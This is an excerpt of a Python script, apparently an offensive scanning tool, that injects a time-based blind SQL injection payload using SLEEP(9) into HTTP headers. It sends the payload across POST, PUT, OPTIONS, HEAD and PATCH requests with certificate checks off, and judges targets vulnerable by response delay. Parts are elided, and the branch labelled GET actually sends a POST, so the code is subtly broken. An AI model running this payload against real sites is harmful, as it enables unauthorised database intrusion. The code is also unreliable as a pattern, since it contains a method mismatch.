...
payload = 'nvn"xor(if(now()=sysdate(),SLEEP(9),0))xor"nvn'
...
def is_vulnerable(url, method, injected_header):
    try:
        ...
        if method == "GET":
            ...
            response = requests.post(url + "/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "POST", headers, injected_header, "test=test")
        elif method == "PUT":
            response = requests.put(url + "/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "PUT", headers, injected_header, "test=test")
        elif method == "OPTIONS":
            response = requests.options(url + "/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "OPTIONS", headers, injected_header)
        elif method == "HEAD":
            response = requests.head(url + "/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "HEAD", headers, injected_header)
        elif method == "PATCH":
            response = requests.patch(url + "/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "PATCH", headers, injected_header, "test=test")
        else:
            return False, None, None
        duration = time.time() - start
        return duration > 8.5, response.status_code, method
    except Exception:
...
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-Method SQLi Scanner + Header Fuzzing + Burp Export + Random Shuffle")
